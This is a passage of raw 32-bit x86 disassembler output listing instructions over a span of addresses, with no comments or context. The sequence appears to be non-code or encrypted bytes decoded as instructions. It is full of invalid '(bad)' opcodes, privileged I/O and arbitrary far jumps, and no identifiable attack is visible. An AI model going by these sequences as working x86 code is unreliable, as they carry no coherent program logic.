  41306f:	int    0xf0
  413071:	mov    al,ds:0xef9c91ec
  413076:	rol    DWORD PTR [ecx],cl
  413078:	sbb    al,0xfe
  41307a:	push   ds
  41307b:	in     al,0x5e
  41307d:	adc    bh,BYTE PTR [ebx-0x1c1b1149]
  413083:	fdivr  DWORD PTR [ebp-0x4f7c0dcd]
  413089:	cdq    
  41308a:	add    BYTE PTR [eax+0x9],bh
  41308d:	clc    
  41308e:	fldenv [edi+ebp*1]
  413091:	leave  
  413092:	sbb    edx,edi
  413094:	repz xlat BYTE PTR ds:[ebx]
  413096:	mov    cs,eax
  413098:	scas   al,BYTE PTR es:[edi]
  413099:	rcr    BYTE PTR [ebx-0x166c5bf3],1
  41309f:	std    
  4130a0:	cs jns 0x41303d
  4130a3:	push   esi
  4130a4:	push   cs
  4130a5:	xor    al,0x3f
  4130a7:	and    esp,DWORD PTR [ecx-0x74881f2]
  4130ad:	mov    dl,0x59
  4130af:	pop    es
  4130b0:	(bad)  
  4130b2:	(bad)  
  4130b3:	(bad)  
  4130b4:	jmp    0x4130e3
  4130b6:	and    edx,DWORD PTR [eax+edi*4-0x1416426f]
  4130bd:	or     al,0xa8
  4130bf:	pop    ss
  4130c0:	pop    edx
  4130c1:	inc    ebp
  4130c2:	sbb    al,0xe2
  4130c4:	sub    ebx,DWORD PTR [ebp-0x29]
  4130c7:	push   edx
  4130c8:	ror    DWORD PTR [ebp-0x2250a1cd],0x67
  4130cf:	cmp    BYTE PTR [esi],cl
  4130d1:	popa   
  4130d2:	mov    ds:0x24b37bc2,al
  4130d7:	xlat   BYTE PTR ds:[ebx]
  4130d8:	daa    
  4130d9:	fucomip st,st(2)
  4130db:	sub    al,0x71
  4130dd:	cmp    BYTE PTR [eax+0x3a7b8ed1],bl
  4130e3:	xchg   esi,eax
  4130e4:	xchg   edi,eax
  4130e5:	int3   
  4130e6:	jo     0x413090
  4130e8:	jb     0x413106
  4130ea:	inc    ebx
  4130eb:	mov    esi,0x454623aa
  4130f0:	add    ecx,DWORD PTR [eax+eiz*2+0xf]
  4130f4:	shl    ah,cl
  4130f6:	scas   eax,DWORD PTR es:[edi]
  4130f7:	(bad)  
  4130f8:	mov    ds:0xec65e4e8,eax
  4130fd:	add    eax,0x4e11b927
  413102:	adc    BYTE PTR [ecx+0x50],dh
  413105:	dec    ebx
  413106:	rcr    BYTE PTR [esi+0x26a4029],cl
  41310c:	les    edi,FWORD PTR [edi-0xd239c25]
  413112:	cs fcmovnu st,st(0)
  413115:	pop    edi
  413116:	sub    DWORD PTR [edx+0x1defa357],ebp
  41311c:	cmp    BYTE PTR [ebx],0xee
  41311f:	popf   
  413120:	and    BYTE PTR [ebp-0x56],ah
  413123:	mov    dh,cl
  413125:	in     al,dx
  413126:	(bad)  
  413127:	adc    ch,cl
  413129:	inc    edx
  41312a:	aam    0x5c
  41312c:	or     ebp,DWORD PTR [edx-0x5b08c4b]
  413132:	sub    BYTE PTR [eax-0x495a7299],bl
  413138:	adc    eax,0x3d05f702
  41313d:	sar    DWORD PTR [edx+0xafa21d0],0xc7
  413144:	inc    ebx
  413145:	sar    DWORD PTR [eax+0x1c],1
  413148:	or     BYTE PTR [edi+0x5e],ah
  41314b:	fcmovb st,st(4)
  41314d:	mov    ecx,0x7c8bf7b2
  413152:	sub    DWORD PTR [edx],ecx
  413154:	test   eax,0xe91220f3
  413159:	dec    edx
  41315a:	add    eax,0xc2b6781
  41315f:	jae    0x41317f
  413161:	outs   dx,DWORD PTR ds:[esi]
  413162:	not    DWORD PTR [edx+0x52]
  413165:	outs   dx,BYTE PTR fs:[esi]
  413167:	sti    
  413168:	clc    
  413169:	cld    
  41316a:	adc    DWORD PTR [ebp+ebp*2-0x27],edi
  41316e:	push   esi
  41316f:	mov    ds:0x6426ada9,al
  413174:	xor    eax,0x106ad938
  413179:	popa   
  41317a:	and    esp,edi
  41317c:	aam    0xa1
  41317e:	xchg   ebx,eax
  41317f:	inc    ebx
  413180:	jge    0x413112
  413182:	inc    eax
  413183:	call   0xfbf4edc4
  413188:	push   ebx
  413189:	mov    DWORD PTR [eax-0x1395dd1f],ebp
  41318f:	inc    ebp
  413190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413191:	ror    DWORD PTR [ebx],cl
  413193:	cmp    ebx,edx
  413195:	xor    DWORD PTR [edi-0x3cd1c3fc],esp
  41319b:	jecxz  0x4131a9
  41319d:	cld    
  41319e:	sub    ebx,DWORD PTR [ecx]
  4131a0:	jno    0x41312e
  4131a2:	adc    ebp,DWORD PTR [ebp+0x31]
  4131a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a6:	pop    ds
  4131a7:	or     edx,ecx
  4131a9:	mov    ch,0xb6
  4131ab:	gs push 0xdcf12a70
  4131b1:	inc    esi
  4131b2:	push   edi
  4131b3:	mov    ecx,0x96a92423
  4131b8:	jp     0x413222
  4131ba:	stos   DWORD PTR es:[edi],eax
  4131bb:	jle    0x41320e
  4131bd:	xchg   esp,eax
  4131be:	or     DWORD PTR [eax],0xd7c4f536
  4131c4:	mov    eax,ds:0xfbfae578
  4131c9:	nop
  4131ca:	repnz cmp DWORD PTR [ecx-0x6e59eda2],ebx
  4131d1:	scas   eax,DWORD PTR es:[edi]
  4131d2:	pop    ebp
  4131d3:	mov    cl,0xc8
  4131d5:	add    esp,DWORD PTR [ebx+0x2b3d6e82]
  4131db:	dec    edi
  4131dc:	imul   al
  4131de:	daa    
  4131df:	je     0x413213
  4131e1:	cmp    eax,0x79b664b1
  4131e6:	sbb    DWORD PTR [ecx-0x28cc0916],0x8e1443dc
  4131f0:	popa   
  4131f1:	push   cs
  4131f2:	push   esi
  4131f3:	xchg   ebp,eax
  4131f4:	ds pop ecx
  4131f6:	lods   al,BYTE PTR ds:[esi]
  4131f7:	aas    
  4131f8:	inc    edx
  4131f9:	nop
  4131fa:	ja     0x4131aa
  4131fc:	fld    QWORD PTR [ecx-0x74]
  4131ff:	push   eax
  413200:	pusha  
  413201:	cmc    
  413202:	or     bl,BYTE PTR [esi+0x5bab9c12]
  413208:	or     edx,edi
  41320a:	sub    ebx,DWORD PTR [edx+0x72]
  41320d:	test   eax,0x75edad24
  413212:	adc    DWORD PTR [edx],ecx
  413214:	adc    eax,0x7a2224bd
  413219:	push   edi
  41321a:	cmp    ecx,ecx
  41321c:	lods   al,BYTE PTR ds:[esi]
  41321e:	sub    cl,BYTE PTR [edx-0x60]
  413221:	out    0xee,al
  413223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413224:	lahf   
  413225:	icebp  
  413226:	ins    DWORD PTR es:[edi],dx
  413227:	pop    ecx
  413228:	or     eax,0x303b264d
  41322e:	(bad)  
  41322f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413230:	nop
  413231:	popa   
  413232:	push   eax
  413233:	jecxz  0x413280
  413235:	ror    BYTE PTR ds:[edi+0xa],cl
  413239:	sub    edi,edx
  41323b:	jno    0x413262
  41323d:	mov    ah,BYTE PTR [ebx-0x26]
  413240:	inc    ebp
  413241:	iret   
  413242:	jae    0x4131c8
  413244:	xchg   ebx,eax
  413245:	adc    DWORD PTR [edx+0x33541503],ecx
  41324b:	jo     0x413249
  41324d:	cdq    
  41324e:	ret    
  41324f:	jmp    0x1dd8:0x27961c49
  413256:	loope  0x41326e
  413258:	sub    BYTE PTR [ebx+0x27b0a298],bl
  41325e:	jne    0x413295
  413260:	arpl   WORD PTR [esi-0x393aedd5],ax
  413266:	test   BYTE PTR [ebx-0x2b],bl
  413269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41326a:	fld    DWORD PTR [edi]
  41326c:	and    al,BYTE PTR [eax+0x5b]
  41326f:	mov    dh,0xd9
  413271:	add    bh,ah
  413273:	cmc    
  413274:	jmp    0x413203
  413276:	mov    dh,0xc3
  413278:	sub    al,dl
  41327a:	xor    al,0xd0
  41327c:	dec    edx
  41327d:	mov    esi,0xb14b71f9
  413282:	std    
  413283:	inc    ebp
  413284:	mov    dl,0xbe
  413286:	mov    esp,0x27c332f8
  41328b:	pop    ebx
  41328c:	ins    DWORD PTR es:[edi],dx
  41328d:	mov    al,ds:0xcaf90cde
  413292:	nop
  413293:	xor    BYTE PTR [esi+0xd21a7fe],ah
  413299:	pop    ebp
  41329a:	mov    cl,0x9
  41329c:	inc    eax
  41329d:	xchg   BYTE PTR [ebx],ch
  41329f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a0:	pop    esp
  4132a1:	mov    dh,0x89
  4132a3:	jmp    FWORD PTR [esi-0x20]
  4132a6:	adc    al,0x43
  4132a8:	adc    DWORD PTR [ecx-0x2b],edx
  4132ab:	or     dl,BYTE PTR [edx+0x60]
  4132ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132af:	jne    0x4132bc
  4132b1:	pop    DWORD PTR [esi+0x6a3d2ac7]
  4132b7:	add    esi,edx
  4132b9:	fbld   TBYTE PTR [eax+ebx*1-0x6f]
  4132bd:	jge    0x413253
  4132bf:	jp     0x4132e1
  4132c1:	aam    0xa9
  4132c3:	in     eax,0x83
  4132c5:	sbb    ah,BYTE PTR [ebx]
  4132c7:	fstp   st(5)
  4132c9:	aad    0x4c
  4132cb:	shl    bh,1
  4132cd:	(bad)
  4132d0:	xchg   ecx,eax
  4132d1:	fcomp  DWORD PTR ds:0x4b85aeaf
  4132d7:	cmp    bh,BYTE PTR gs:[edi]
  4132da:	pushf  
  4132db:	ss sub cl,ch
  4132de:	jge    0x4132b6
  4132e0:	rol    BYTE PTR [ebx-0x25e1cc00],0x12
  4132e7:	rol    BYTE PTR [ecx-0x68],1
  4132ea:	pop    ebp
  4132eb:	push   esp
  4132ec:	mov    esp,0x389c5819
  4132f1:	outs   dx,BYTE PTR ds:[esi]
  4132f2:	js     0x41336b
  4132f4:	(bad)  
  4132f5:	sahf   
  4132f6:	clc    
  4132f7:	jmp    0x4132dc
  4132f9:	test   BYTE PTR [esi+0x42],ah
  4132fc:	push   edx
  4132fd:	fisub  WORD PTR [si]
  413300:	or     bl,BYTE PTR [ebx]
  413302:	dec    ecx
  413303:	cli    
  413304:	push   es
  413305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413306:	jo     0x41333a
  413308:	js     0x413346
  41330a:	add    dl,BYTE PTR [ebx-0x3bd1a29e]
  413310:	pusha  
  413311:	retf   0xf108
  413314:	add    BYTE PTR [ebx-0x44272557],dh
  41331a:	sbb    eax,DWORD PTR [ebx+0x354e9a48]
  413320:	add    BYTE PTR [edi],bl
  413322:	call   0x8d41a6df
  413327:	or     cl,BYTE PTR [eax+0x315bd7ec]
  41332d:	fdiv   DWORD PTR cs:0x889d
  413333:	pop    ebx
  413334:	retf   
  413335:	ret    0x5e1f
  413338:	dec    ecx
  413339:	cmc    
  41333a:	shl    BYTE PTR [esi],1
  41333c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41333d:	ret    0x7ec7
  413340:	mov    ecx,DWORD PTR [edi-0x43]
  413343:	cmc    
  413344:	cwde   
  413345:	xor    DWORD PTR [edx],esi
  413347:	mov    ch,0x5b
  413349:	add    al,0xb3
  41334b:	fnstsw WORD PTR ss:[eax+edi*8-0x1a]
  413350:	ret    0xecac
  413353:	nop
  413354:	add    bl,bl
  413356:	adc    DWORD PTR [edx+ecx*2+0x57],edi
  41335a:	push   ds
  41335b:	(bad)  
  41335c:	fiadd  DWORD PTR [ebx]
  41335e:	cld    
  41335f:	push   eax
  413360:	push   ds
  413361:	sahf   
  413362:	inc    esi
  413363:	pop    edx
  413364:	mov    al,0xdd
  413366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413367:	call   0x57681b22
  41336c:	leave  
  41336d:	pop    ecx
  41336e:	loop   0x4133e0
  413370:	imul   edi,DWORD PTR [edi+0x10],0x39
  413374:	imul   ebx,DWORD PTR [eax-0x52844f6a],0x2c
  41337b:	stos   DWORD PTR es:[edi],eax
  41337c:	pop    ebx
  41337d:	(bad)  
  41337e:	ds int 0x6e
  413381:	outs   dx,DWORD PTR ds:[esi]
  413382:	cmp    al,0xb8
  413384:	cs sub al,0xa8
  413387:	xor    al,0x5
  413389:	push   esp
  41338a:	fsubr  QWORD PTR [ecx+0xb]
  41338d:	out    dx,eax
  41338e:	lahf   
  41338f:	pop    edx
  413390:	scas   al,BYTE PTR es:[edi]
  413391:	pop    ebx
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	aad    0x83
  413395:	xchg   ebx,eax
  413396:	mov    gs,WORD PTR [ebx+0x6b]
  413399:	(bad)  
  41339a:	shr    BYTE PTR [esi+0x6f36e5f7],cl
  4133a0:	mov    ah,0x18
  4133a2:	sbb    ecx,esp
  4133a4:	mov    cl,0x88
  4133a6:	add    BYTE PTR ss:[edi],bh
  4133a9:	xor    BYTE PTR [eax],0x12
  4133ac:	test   ebx,ebx
  4133ae:	sub    dh,BYTE PTR [eax+0x44]
  4133b1:	nop
  4133b2:	js     0x4133c7
  4133b4:	scas   eax,DWORD PTR es:[edi]
  4133b5:	stos   BYTE PTR es:[edi],al
  4133b6:	not    BYTE PTR [ebp+0x37]
  4133b9:	mov    BYTE PTR [eax],al
  4133bb:	or     al,0x64
  4133bd:	imul   edi,DWORD PTR [ebx-0x10bd5fc2],0xffffff8d
  4133c4:	dec    ebp
  4133c5:	dec    ebx
  4133c6:	xor    DWORD PTR [edi+0x55],eax
  4133c9:	or     ebx,eax
  4133cb:	jno    0x413354
  4133cd:	es adc eax,0xc848cb6b
  4133d3:	pop    ebp
  4133d4:	jge    0x41336d
  4133d6:	mov    ds:0x23b81cb,al
  4133db:	ret    
  4133dc:	loop   0x4133be
  4133de:	ss inc eax
  4133e0:	cmp    BYTE PTR [edi-0x40],bl
  4133e3:	ror    BYTE PTR [edx],0xc3
  4133e6:	xchg   ebx,eax
  4133e7:	and    al,0x9c
  4133e9:	aad    0xa6
  4133eb:	retf   0x17a0
  4133ee:	inc    edi
  4133ef:	in     al,dx
  4133f0:	mov    dl,0x40
  4133f2:	addr16 dec esp
  4133f4:	mov    ds:0x9b05a4dd,eax
  4133f9:	mov    al,ah
  4133fb:	xor    DWORD PTR [ebx-0x15],ecx
  4133fe:	shr    DWORD PTR [edi+edx*2+0x6a],cl
  413402:	mov    bh,0x2f
  413404:	repz sub eax,0x3edd71d8
  41340a:	sbb    al,0xce
  41340c:	sbb    ecx,ecx
  41340e:	(bad)  
  41340f:	mov    edi,0x3acb26f
  413414:	xchg   edx,eax
  413415:	data16 cmp dl,0x19
  413419:	sbb    BYTE PTR [ecx+ebp*2-0x37],ah
  41341d:	dec    esi
  41341e:	fisubr WORD PTR [edx-0x63]
  413421:	adc    BYTE PTR [edi-0x731581c2],ah
  413427:	cld    
  413428:	repnz cmp eax,0x4f4a2d4
  41342e:	gs xor ecx,ecx
  413431:	mov    ch,0x9d
  413433:	and    edi,edi
  413435:	call   0xe1d19df6
  41343a:	add    al,0x16
  41343c:	fimul  WORD PTR [ebp-0x66]
  41343f:	pop    esi
  413440:	xchg   edx,eax
  413441:	mov    ch,0x83
  413443:	nop
  413444:	mov    dl,0x9a
  413446:	ins    DWORD PTR es:[edi],dx
  413447:	ret    0x2873
  41344a:	cli    
  41344b:	ins    DWORD PTR es:[edi],dx
  41344c:	int3   
  41344d:	data16 (bad) 
  41344f:	int    0xe9
  413451:	test   DWORD PTR [eax],edx
  413453:	lods   eax,DWORD PTR ds:[esi]
  413454:	retf   0xa9f6
  413457:	cli    
  413458:	xchg   esp,eax
  413459:	mul    BYTE PTR [esi+0x54]
  41345c:	mov    ds:0x78b1d854,al
  413461:	outs   dx,DWORD PTR ds:[esi]
  413462:	push   0x57a1be0e
  413467:	mov    edi,DWORD PTR [ebp+0x564611a4]
  41346d:	cmp    BYTE PTR [edi-0x57e3ebfd],dh
  413473:	adc    BYTE PTR [ecx-0x70],0x81
  413477:	or     DWORD PTR [ebx+0x4e],0x58
  41347b:	xor    ebx,DWORD PTR [edx]
  41347d:	js     0x4134ce
  41347f:	mov    ds:0x6a5cc3c9,al
  413484:	jnp    0x41342c
  413486:	mov    dl,0x1e
  413488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413489:	cmp    cl,BYTE PTR [edx+0x190a9a40]
  41348f:	in     al,0xb
  413491:	mov    esp,DWORD PTR [edx-0x39eb915a]
  413497:	daa    
  413498:	mov    dl,0xe2
  41349a:	sub    BYTE PTR [ebx+0x71],dl
  41349d:	int    0x25
  41349f:	pop    esi
  4134a0:	popf   
  4134a1:	dec    eax
  4134a2:	in     eax,0x41
  4134a4:	add    dh,cl
  4134a6:	or     al,0x6c
  4134a8:	cbw    
  4134aa:	faddp  st(1),st
  4134ac:	mov    ebx,0xf7b645f8
  4134b1:	ss sub eax,0x8ffb164a
  4134b7:	into   
  4134b8:	or     bl,al
  4134ba:	icebp  
  4134bb:	jmp    0x41352e
  4134bd:	rcl    BYTE PTR [eax+esi*1+0x7ba75418],0xb3
  4134c5:	rcr    BYTE PTR [eax-0x4a],0xbe
  4134c9:	mov    al,ds:0x167c29b0
  4134ce:	mov    cl,0x8b
  4134d0:	cmp    ebx,DWORD PTR [edx+0x24]
  4134d3:	add    ah,BYTE PTR [eax]
  4134d5:	fild   QWORD PTR [edx]
  4134d7:	nop
  4134d8:	xor    BYTE PTR [eax],ah
  4134da:	ror    dl,1
  4134dc:	jmp    0x78db:0xec976639
  4134e3:	mov    ds:0xd6a2f8ba,al
  4134e8:	sahf   
  4134e9:	pop    ds
  4134ea:	pop    eax
  4134eb:	(bad)
  4134ef:	mul    DWORD PTR [eax]
  4134f1:	test   edi,ebp
  4134f3:	jecxz  0x413511
  4134f5:	(bad)  
  4134f6:	test   al,0xfa
  4134f8:	(bad)  
  4134f9:	js     0x41349d
  4134fb:	sti    
  4134fc:	mov    ebp,0x94a030cc
  413501:	pushf  
  413502:	xchg   edx,eax
  413503:	fcom   DWORD PTR [edi+edx*1-0x659b9b48]
  41350a:	popa   
  41350b:	dec    eax
  41350c:	pusha  
  41350d:	cmp    esp,ebx
  41350f:	cmp    al,0x7e
  413511:	fiadd  WORD PTR gs:[edx+0xda72034]
  413518:	out    0xf5,al
  41351a:	ficom  WORD PTR [ebp+0x475134ff]
  413520:	pop    ss
  413521:	xchg   DWORD PTR [esi-0x75],ebx
  413524:	jg     0x41353a
  413526:	xor    bh,ch
  413528:	mov    ebp,0xcfdc8a6
  41352d:	in     eax,0xf5
  41352f:	inc    esp
  413530:	mov    ds:0x375f1026,eax
  413535:	push   ecx
  413536:	adc    eax,0xbc6e47d1
  41353b:	mov    dh,0x9c
  41353d:	loop   0x413585
  41353f:	ret    
  413540:	adc    bl,BYTE PTR [ebx]
  413542:	test   BYTE PTR [esi-0x74e9a679],dh
  413548:	sbb    ch,BYTE PTR [ebx-0x10]
  41354b:	jl     0x4135b7
  41354d:	sbb    al,0x65
  41354f:	nop
  413550:	or     ebp,DWORD PTR [edi]
  413552:	or     BYTE PTR [esi+0x5dc5c459],bl
  413558:	and    ch,BYTE PTR [ebx+0x567e784d]
  41355e:	sar    BYTE PTR [esi+0x54],cl
  413561:	sub    BYTE PTR [edi-0x166a8078],bl
  413567:	popf   
  413568:	xchg   ecx,eax
  413569:	add    BYTE PTR [ebx],0x41
  41356c:	mov    ds:0x692488b8,eax
  413571:	xlat   BYTE PTR ds:[ebx]
  413572:	scas   eax,DWORD PTR es:[edi]
  413573:	mov    ds:0x316c3ad0,eax
  413578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413579:	xchg   ecx,eax
  41357a:	or     edx,DWORD PTR [edx]
  41357c:	dec    esi
  41357d:	dec    esp
  41357e:	xchg   edi,eax
  41357f:	mov    ebx,0xe49415ce
  413584:	dec    edi
  413585:	sbb    al,BYTE PTR [edx-0x67]
  413588:	xor    BYTE PTR [edx-0x2f],dh
  41358b:	add    al,0x26
  41358d:	sub    BYTE PTR [edi],0x39
  413590:	test   al,0xba
  413592:	imul   ecx,DWORD PTR [esi],0xe826f1f7
  413598:	pop    DWORD PTR fs:[ecx+0x37f11384]
  41359f:	call   DWORD PTR [ecx+0x6a]
  4135a2:	xchg   edx,eax
  4135a3:	jnp    0x413527
  4135a5:	push   ecx
  4135a6:	push   cs
  4135a7:	fidiv  DWORD PTR [ecx]
  4135a9:	jno    0x41353b
  4135ab:	xchg   BYTE PTR [eax+0x6289e1e3],bl
  4135b1:	dec    ecx
  4135b2:	jecxz  0x413591
  4135b4:	push   0x18
  4135b6:	jno    0x4135a4
  4135b8:	ins    DWORD PTR es:[edi],dx
  4135b9:	add    edi,ecx
  4135bb:	addr16 lahf 
  4135bd:	jmp    0x4135e5
  4135bf:	js     0x413561
  4135c1:	inc    ebx
  4135c2:	cli    
  4135c3:	jmp    0x65dbd913
  4135c8:	mov    cl,0xee
  4135ca:	fnstsw WORD PTR [edi+edx*4-0x45]
  4135ce:	inc    ecx
  4135cf:	push   esi
  4135d0:	mov    esp,0xc5af3ca7
  4135d5:	(bad)  
  4135d7:	mov    bl,0x7
  4135da:	cmp    bl,BYTE PTR [eax-0x73]
  4135dd:	sub    edi,DWORD PTR [ebp+0x78]
  4135e0:	nop
  4135e1:	retf   0x9e49
  4135e4:	lods   eax,DWORD PTR ds:[esi]
  4135e5:	(bad)  
  4135e6:	into   
  4135e7:	pop    ebp
  4135e8:	pop    ss
  4135e9:	in     al,dx
  4135ea:	mov    ecx,gs
  4135ec:	stos   BYTE PTR es:[edi],al
  4135ed:	ret    0x9937
  4135f0:	fwait
  4135f1:	arpl   WORD PTR [eax],ax
  4135f3:	add    DWORD PTR [edi+0x62],eax
  4135f6:	mov    DWORD PTR [ebp+0x3c],0x35638754
  4135fd:	out    0x3f,al
  4135ff:	scas   al,BYTE PTR es:[edi]
  413600:	rcl    DWORD PTR [edi-0xdd41a3],1
  413606:	mov    esp,0xb240a4f0
  41360b:	imul   ebx,DWORD PTR [esi],0xffffff8e
  41360e:	ret    
  41360f:	dec    esi
  413610:	push   ecx
  413611:	jbe    0x413604
  413613:	repnz shr ch,cl
  413616:	sbb    bh,ch
  413618:	push   eax
  413619:	aaa    
  41361a:	add    dl,BYTE PTR [edi-0x50d2f44]
  413620:	mov    ebp,ebp
  413622:	call   0xe38c40d0
  413627:	sbb    eax,DWORD PTR [edi-0x42]
  41362a:	cmp    DWORD PTR [edi],edx
  41362c:	cmp    bl,BYTE PTR [ecx+edx*8]
  41362f:	fs xor dl,0x30
  413633:	mov    ecx,0xe0bde182
  413638:	mov    BYTE PTR ds:0xed6a0b70,bl
  41363e:	inc    edi
  41363f:	lds    ebx,FWORD PTR [edi+ebx*8]
  413642:	pop    esi
  413643:	ins    BYTE PTR es:[edi],dx
  413644:	scas   al,BYTE PTR es:[edi]
  413645:	daa    
  413646:	cmc    
  413647:	mov    fs,WORD PTR [ecx+esi*8-0x25]
  41364b:	in     eax,dx
  41364c:	mov    ah,0x1a
  41364e:	(bad)  
  41364f:	(bad)  
  413650:	sbb    ah,bh
  413652:	in     eax,dx
  413653:	in     eax,0x45
  413655:	jbe    0x4136a2
  413657:	mov    dl,0x49
  413659:	mul    ecx
  41365b:	rol    BYTE PTR [edx+0x58c8c68d],1
  413661:	les    edi,FWORD PTR [edi-0x60]
  413664:	sbb    cl,BYTE PTR [ebp+ecx*4+0x6]
  413668:	sub    ecx,DWORD PTR [ecx-0x637ec7f3]
  41366e:	ficom  DWORD PTR [ebp-0x14]
  413671:	xor    al,0xb9
  413673:	ret    0xb31a
  413676:	push   0xfffffffd
  413678:	push   cs
  413679:	ficomp WORD PTR [eax+0x58cbd9d4]
  41367f:	xlat   BYTE PTR ds:[ebx]
  413680:	pushf  
  413681:	sbb    BYTE PTR [ebx],dh
  413683:	adc    edi,DWORD PTR [edi]
  413685:	xor    eax,0xabfcbb5a
  41368a:	ucomiss xmm2,DWORD PTR [ecx]
  41368d:	sbb    BYTE PTR [ecx-0x25daefcf],0xcc
  413694:	scas   eax,DWORD PTR es:[edi]
  413695:	mov    esp,0xcd894e70
  41369a:	cs stos BYTE PTR es:[edi],al
  41369c:	das    
  41369d:	in     al,dx
  41369e:	xchg   ebp,eax
  41369f:	xor    al,0x82
  4136a1:	mov    ds,WORD PTR [esp+edx*4]
  4136a4:	ins    BYTE PTR es:[edi],dx
  4136a5:	lods   al,BYTE PTR ds:[esi]
  4136a6:	mov    ebx,eax
  4136a8:	mov    esp,0x21e7a50f
  4136ad:	push   0x4370a38f
  4136b2:	test   DWORD PTR [ebx],0x3f82f2ac
  4136b8:	scas   eax,DWORD PTR es:[edi]
  4136b9:	fld    DWORD PTR [esi+0x1e]
  4136bc:	mov    DWORD PTR [eax],edi
  4136be:	xor    BYTE PTR [esi+0x5f],ah
  4136c1:	scas   al,BYTE PTR es:[edi]
  4136c2:	push   ebp
  4136c3:	mov    esp,0x8d3c9bd9
  4136c8:	jne    0x413700
  4136ca:	adc    edx,edi
  4136cc:	mov    edx,0x99ff985f
  4136d1:	test   DWORD PTR [ecx-0x5d],ebx
  4136d4:	ins    DWORD PTR es:[edi],dx
  4136d5:	nop
  4136d6:	xchg   esi,eax
  4136d7:	pop    ebx
  4136d8:	pushw  0x695d
  4136dc:	(bad)  
  4136dd:	aad    0x97
  4136df:	(bad)  
  4136e0:	jge    0x41372c
  4136e2:	inc    ecx
  4136e3:	cmp    BYTE PTR [eax],0x14
  4136e6:	cmc    
  4136e7:	dec    ebp
  4136e8:	imul   ecx,esi,0xffffffad
  4136eb:	addr16 sbb eax,0xa8210bfb
  4136f1:	inc    eax
  4136f2:	sub    cl,BYTE PTR [edx+0x11fcbc55]
  4136f8:	cmp    BYTE PTR [esi-0xf346fa6],ch
  4136fe:	or     al,0xa1
  413700:	or     BYTE PTR [esi],al
  413702:	push   0x55b904b3
  413707:	dec    edi
  413708:	jecxz  0x41372e
  41370a:	mov    ds,WORD PTR [ecx-0x203c0a38]
  413710:	mov    eax,0x843c9edb
  413715:	cmp    dl,BYTE PTR [ecx-0x137c9c44]
  41371b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41371c:	lods   eax,DWORD PTR ds:[esi]
  41371d:	adc    dh,BYTE PTR [ecx+0x79]
  413720:	sub    bl,dh
  413722:	pop    ecx
  413723:	push   ebp
  413724:	or     eax,0x599d4e47
  413729:	test   BYTE PTR [esi+0x67],bl
  41372c:	sub    esp,0x42a9ee38
  413732:	xchg   DWORD PTR cs:[ebp+0x7a],eax
  413736:	xor    al,al
  413738:	lds    ebx,FWORD PTR [eax-0x335a0358]
  41373e:	aas    
  41373f:	sub    DWORD PTR [edi+0x405dd922],ecx
  413745:	out    0x8f,eax
  413747:	cmp    ah,BYTE PTR [edi+0x34]
  41374a:	inc    ebp
  41374b:	aaa    
  41374c:	bound  ebx,QWORD PTR [ecx]
  41374e:	out    0x63,eax
  413750:	lea    eax,[esi]
  413752:	test   dl,dh
  413754:	jno    0x41379a
  413756:	ds inc edi
  413758:	inc    edi
  413759:	and    BYTE PTR [edx],ch
  41375b:	adc    al,0x77
  41375d:	(bad)  
  41375e:	mov    eax,0x427b43da
  413763:	shr    edi,cl
  413765:	lock jmp 0x22c3:0xf26ae7e0
  41376d:	push   edi
  41376e:	mov    dl,0x6
  413770:	fst    QWORD PTR [esi]
  413772:	out    dx,eax
  413773:	xor    eax,0x9b8ddb97
  413778:	adc    ch,BYTE PTR [esi]
  41377a:	imul   ebx,DWORD PTR [esi],0x5c
  41377d:	dec    esi
  41377e:	cwde   
  41377f:	test   eax,0xac7e54fc
  413784:	mov    al,0x91
  413786:	cwde   
  413787:	adc    eax,0xbc792bb5
  41378c:	push   ebp
  41378d:	call   0x384264e5
  413792:	ins    DWORD PTR es:[edi],dx
  413793:	cdq    
  413794:	adc    edi,DWORD PTR [edx]
  413796:	mov    ah,0x8
  413798:	and    al,BYTE PTR [eax-0x50]
  41379b:	or     eax,0xd640f664
  4137a0:	lods   eax,DWORD PTR ds:[esi]
  4137a1:	mov    dh,BYTE PTR [ebp+0x2e10dd1d]
  4137a7:	out    0xcf,eax
  4137a9:	ror    DWORD PTR [ecx],1
  4137ab:	inc    edi
  4137ac:	lahf   
  4137ad:	adc    eax,0xfd2756c1
  4137b2:	xchg   ecx,eax
  4137b3:	es stos DWORD PTR es:[edi],eax
  4137b5:	ret    0x519d
  4137b8:	inc    esi
  4137b9:	std    
  4137ba:	mov    ecx,0x8cad4d8b
  4137bf:	sbb    esi,esi
  4137c1:	mov    eax,0x52f0a2ab
  4137c6:	les    esp,FWORD PTR [esi-0x46]
  4137c9:	sti    
  4137ca:	jl     0x4137ca
  4137cc:	imul   ebp,DWORD PTR [edx-0x1a],0xcbbd4a9d
  4137d3:	call   0x8061:0x9f0d2a5f
  4137da:	cmp    dh,BYTE PTR [ecx]
  4137dc:	lods   al,BYTE PTR ds:[esi]
  4137dd:	ins    DWORD PTR es:[edi],dx
  4137de:	push   cs
  4137df:	pop    esp
  4137e0:	xchg   BYTE PTR [ebx-0x76b51d90],dl
  4137e6:	(bad)  
  4137e7:	(bad)  [ecx]
  4137e9:	cli    
  4137ea:	mov    ebx,0x82e8f8c2
  4137ef:	ret    
  4137f0:	arpl   si,sp
  4137f2:	ret    0xbcd2
  4137f5:	cmc    
  4137f6:	in     al,dx
  4137f7:	pop    esi
  4137f8:	stos   BYTE PTR es:[edi],al
  4137f9:	mov    al,0xc4
  4137fb:	lahf   
  4137fc:	ret    
  4137fd:	xchg   esi,eax
  4137fe:	xchg   edx,eax
  4137ff:	sub    ah,0x16
  413802:	xor    bl,ah
  413804:	int    0x8e
  413806:	stos   BYTE PTR es:[edi],al
  413807:	int3   
  413808:	cld    
